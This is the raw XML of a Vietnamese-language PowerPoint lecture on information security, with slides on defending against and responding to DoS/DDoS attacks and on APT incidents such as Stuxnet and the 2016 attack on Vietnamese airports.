                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phòng thủ chống lại cuộc tấn công DDoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50179" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{273C60F2-6D94-49FB-9608-CD8A99C801F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Kế hoạch ứng phó tốt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Chi tiết về làm thế nào để liên hệ với cán bộ kỹ thuật của các ISP </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Cần thiết áp đặt lọc luồng upstream</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Chi tiết về cách đối phó với các cuộc tấn công</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Thực hiện chống giả mạo, directed broadcast, và các bộ lọc giới hạn tốc độ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Lý tưởng nhất là có giám sát mạng và IDS để phát hiện và thông báo mẫu lưu lượng bất thường</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4147748682"/>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C53D5CE4-68BE-41DE-B020-991B17AC8754}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1717104" y="274638"/>
            <a:ext cx="8915400" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phòng thủ chống lại cuộc tấn công DDoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52227" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1050FBDE-999C-4F6A-B5E6-25D1E540127F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1717104" y="1676400"/>
            <a:ext cx="8915400" cy="4800600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Xác định loại tấn công</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Nắm bắt và phân tích các gói tin </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Thiết kế bộ lọc để chặn luồng tấn công upstream</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Hoặc xác định và sửa các bug hệ thống đúng / ứng dụng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Có truy vết luồng ISP về nguồn</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Có thể khó khăn và tốn nhiều thời gian</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Cần thiết nếu có kế hoạch hành động hợp pháp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Thực hiện kế hoạch dự phòng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Chuyển đến các máy chủ sao lưu thay thế</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Đặt các máy chủ mới tại một địa điểm mới với địa chỉ mới</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Cập nhật kế hoạch ứng phó sự cố</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3838336850"/>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882B2DC1-B27B-46C5-AA4D-28C28853A3A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:prstClr val="white"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54275" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F4FFC9F4-C5AF-4B51-8A97-A0B74C072E62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1638300" y="1676401"/>
            <a:ext cx="9080500" cy="4454525"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Giới thiệu DoS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Tấn công flooding cổ điển và giả mạo SYN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>ICMP, UDP, TCP SYN floods</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Tấn công từ chối (DDoS) nhằm phục vụ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Tấn công phản xạ và khuyếch đại</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Phòng thủ chống lại các cuộc tấn công DoS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Ứng phó với các cuộc tấn công DoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-AU" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2637008029"/>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600200" y="317365"/>
            <a:ext cx="10287000" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>TẤN C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ÔNG APT (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Advanced Persistent Threats)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="3" name="Diagram 2"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2717800" y="1299633"/>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10676229"/>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Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>TẤN CÔNG APT (Advanced Persistent Threats)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5122" name="Picture 2" descr="http://antoanthongtin.vn/Portals/0/UploadImages/News/Images/Apt--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52750" y="1543843"/>
            <a:ext cx="6286500" cy="49149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9921079"/>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378753"/>
            <a:ext cx="10820400" cy="576262"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>TẤN CÔNG APT (Advanced Persistent Threats)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Sâu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Stuxnet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tấn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Iran</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>háng 6/2010 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>một sâu máy tính có tên gọi “Stuxnet” đã tấn công một cơ sở hạt nhân của Iran tại Natanz. Stuxnet đã nhiễm vào hơn 60.000 máy tính, quá nửa trong số đó là ở Iran; các nước khác cũng bị ảnh hưởng bao gồm Ấn Độ, Indonesia, Trung Quốc, Azerbaijan, Hàn Quốc, Malaysia, Mỹ, Anh, Australia, Phần Lan và Đức. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://nghiencuuquocte.org/2014/03/11/stuxnet-chien-tranh-mang/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1028" name="Picture 4" descr="Image result for stuxne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43876" y="3529004"/>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Image result for stuxnet"/>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72075" y="3438939"/>
            <a:ext cx="2743200" cy="2196746"/>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Image result for stuxnet"/>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98650" y="3801402"/>
            <a:ext cx="3028950" cy="15049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1044541"/>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vi-VN" dirty="0"/>
              <a:t>Sân bay Nội Bài, Tân Sơn Nhất bị tin tặc tấn công</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (29/7/2016)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Khoảng 16h ngày 29/7, tại sân bay Nội Bài và Tân Sơn Nhất, hành khách làm thủ tục bất ngờ khi thấy các màn hình thông tin chuyến bay xuất hiện thông tin kích động, xúc phạm Việt Nam và Philippines, xuyên tạc các nội dung về Biển Đông. Hệ thống phát thanh của sân bay cũng phát đi những thông điệp tương tự.</a:t>
            </a:r>
          </a:p>
          <a:p>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49736" y="3962318"/>
            <a:ext cx="3600450" cy="22106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4001294"/>
            <a:ext cx="2895600" cy="2171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4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A0252271-1E64-49F4-945B-F67A3C7B94E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>TẤN CÔNG APT (Advanced Persistent Threats)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1416546567"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Theme-nqd">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nqd" id="{1E9CD956-91D9-477F-BF0C-2721B2E028EC}" vid="{D8E99851-D963-44D1-8D9D-E8B014DE37B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Theme-nqd</Template>
  <TotalTime>1926528</TotalTime>
  <Words>20429</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>1321</Paragraphs>
  <Slides>185</Slides>
  <Notes>80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185</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="198" baseType="lpstr">
      <vt:lpstr>ＭＳ Ｐゴシック</vt:lpstr>
      <vt:lpstr>黑体</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Century Gothic</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Lucida Sans Unicode</vt:lpstr>
      <vt:lpstr>Times</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Trebuchet MS</vt:lpstr>
      <vt:lpstr>Verdana</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Theme-nqd</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>NỘI DUNG</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>I. TỔNG QUAN NGUY CƠ GÂY MẤT ATTT</vt:lpstr>
      <vt:lpstr>Nguy cơ ngẫu nhiên</vt:lpstr>
      <vt:lpstr>Nguy cơ gian lận và trộm cắp</vt:lpstr>
      <vt:lpstr>Nguy cơ lừa đảo </vt:lpstr>
      <vt:lpstr>Nguy cơ lừa đảo </vt:lpstr>
      <vt:lpstr>Nguy cơ rò rỉ thông tin qua các kênh truyền </vt:lpstr>
      <vt:lpstr>Kênh rò rỉ thông tin </vt:lpstr>
      <vt:lpstr>Kênh rò rỉ thông tin</vt:lpstr>
      <vt:lpstr>Các nguyên nhân chính làm rò rỉ TT</vt:lpstr>
      <vt:lpstr>NỘI DUNG</vt:lpstr>
      <vt:lpstr>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</vt:lpstr>
      <vt:lpstr>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</vt:lpstr>
      <vt:lpstr>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</vt:lpstr>
      <vt:lpstr>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</vt:lpstr>
      <vt:lpstr>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</vt:lpstr>
      <vt:lpstr>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</vt:lpstr>
      <vt:lpstr>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</vt:lpstr>
      <vt:lpstr>Kiểm thử thâm nhập (Penetration Testing)</vt:lpstr>
      <vt:lpstr>                                                                                           Kiểm thử thâm nhập (Penetration Testing) </vt:lpstr>
      <vt:lpstr>                                                                                           Kiểm thử thâm nhập (Penetration Testing) </vt:lpstr>
      <vt:lpstr>                                                                                           Kiểm thử thâm nhập (Penetration Testing) </vt:lpstr>
      <vt:lpstr>Kiểm thử thâm nhập (Penetration Testing) </vt:lpstr>
      <vt:lpstr>Kiểm thử thâm nhập (Penetration Testing) </vt:lpstr>
      <vt:lpstr>NỘI DUNG</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Khái niệm, phân loại</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Khái niệm, phân loại</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Thuật ngữ</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Thuật ngữ</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Xu thế phát triển </vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền lây nhiễm nội dung – Virus</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền lây nhiễm nội dung – Virus</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền lây nhiễm nội dung – Virus</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền lây nhiễm nội dung – Virus</vt:lpstr>
